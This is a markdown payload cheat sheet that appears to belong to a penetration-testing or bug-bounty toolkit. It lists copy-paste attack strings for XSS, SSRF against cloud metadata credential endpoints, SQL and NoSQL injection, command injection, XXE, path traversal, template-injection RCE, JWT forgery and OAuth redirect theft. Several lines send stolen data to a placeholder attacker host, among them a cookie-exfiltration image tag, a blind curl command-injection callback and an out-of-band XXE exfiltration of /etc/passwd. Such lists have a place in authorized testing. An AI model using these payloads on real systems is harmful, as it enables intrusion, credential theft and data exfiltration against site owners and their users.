# Payload Arsenal (raw strings)

Copy-paste payloads. Taxonomy/methodology is in [backend-classes.md](backend-classes.md); this is the
string reference. Always prove impact — `alert(1)`/DNS-ping/error-string alone is N/A (see
[validation.md](validation.md)).

## XSS
```
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><img src=x onerror=alert(1)>
javascript:alert(document.domain)
# proof-of-impact (cookie exfil):
<img src=x onerror="fetch('https://ATT?c='+btoa(document.cookie))">
# CSP present → Angular/CSTI: {{constructor.constructor('alert(1)')()}}
# mXSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
# polyglot:
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
```
DOM sinks: `innerHTML/outerHTML/document.write/eval/setTimeout(str)/new Function/location.href/el.src`.
Sources: `location.hash/search/href, document.referrer, window.name, document.URL`.

## SSRF — cloud metadata
```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
       http://169.254.169.254/latest/dynamic/instance-identity/document
GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
       (header: Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01  (header: Metadata: true)
```
Internal fingerprint: `:6379` Redis · `:9200` ES `/_cat/indices` · `:27017` Mongo · `:2375` Docker
`/containers/json` · `:8080` admin.

## SSRF — IP/parser bypass (all = 127.0.0.1)
```
http://2130706433        (decimal)      http://0177.0.0.1     (octal)
http://0x7f.0x0.0x0.0x1  (hex)          http://127.1          (short)
http://[::1]             (v6 loopback)  http://[::ffff:127.0.0.1]
# DNS rebinding: A→external then flips internal after the allowlist check
# redirect chain: http://allowed.com/redirect?to=http://169.254.169.254/
```

## SQLi
```
Detect:  '   ''   ' OR '1'='1   ' OR 1=1--   ' OR 1=1#   ' UNION SELECT NULL--
Time:    ' AND SLEEP(5)--  (MySQL)   ' AND pg_sleep(5)--  (PG)
         '; WAITFOR DELAY '0:0:5'--  (MSSQL)   ' AND 1=dbms_pipe.receive_message('a',5)--  (Oracle)
Union:   ' UNION SELECT NULL,NULL--  → grow NULLs to column count
WAF:     /*!50000SELECT*/  SE/**/LECT  SeLeCt  %27+OR+%271%27=%271  (unicode ʼ apostrophe)
```

## NoSQLi (Mongo)
```
{"username":{"$gt":""},"password":{"$gt":""}}     {"email":{"$regex":".*"}}
{"$where":"sleep(5000)"}
```

## Command injection
```
; id    | id    `id`    $(id)    %0a id    && id    || id
;curl http://ATT/$(whoami)     # blind OOB
```

## XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!-- OOB exfil -->
<!DOCTYPE foo [<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % p "<!ENTITY exfil SYSTEM 'http://ATT/?%d;'>">%p;]><foo>&exfil;</foo>
<!-- SVG upload: --> <image href="file:///etc/passwd"/>
```

## Path traversal
```
../../../etc/passwd        ....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd    ..%252f..%252fetc%252fpasswd  (double-encode)
/etc/passwd%00.jpg  (null trunc)   ....\/....\/etc/passwd
# LFI→RCE: php://filter/convert.base64-encode/resource=index.php  (source disclosure)
```

## SSTI
```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {{7*'7'}}
Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}
```

## JWT
```
alg:none    → header {"alg":"none"}, strip signature
alg confusion RS256→HS256 → sign with the public key as HMAC secret
kid injection → kid: "../../dev/null" or SQLi in kid
jku/jwks injection → point jku to attacker-hosted JWKS
Claim swap → change sub/uid/role/isAdmin, re-sign if key known
```

## OAuth / open redirect
```
redirect_uri bypass: https://target.com.attacker.com  /  https://attacker.com?.target.com
  https://target.com/redirect?url=//attacker.com   /  redirect_uri=https://target.com/callback/../../evil
  path-append: redirect_uri=https://sub.target.com@attacker.com
Steal code: leak via Referer, or subdomain-takeover host registered as a valid redirect_uri.
```
